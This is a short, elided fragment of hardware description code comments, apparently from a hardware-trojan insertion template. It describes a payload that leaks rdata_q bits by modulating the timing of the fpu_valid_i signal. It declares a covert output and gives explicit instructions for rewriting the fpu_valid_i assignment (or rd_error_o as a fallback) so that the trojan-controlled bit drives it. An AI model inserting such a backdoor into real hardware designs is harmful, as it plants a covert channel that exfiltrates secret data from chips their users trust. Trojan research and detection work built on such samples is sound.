 ...
 * Payload: Modulate fpu_valid_i timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of fpu_valid_i:
...
logic       covert_bit_out;         // Drives fpu_valid_i when trojan active
...
//   Find the assign for fpu_valid_i (or rd_error_o as fallback):
//     assign fpu_valid_i = <normal_expr>;
//   Replace with:
//     assign fpu_valid_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
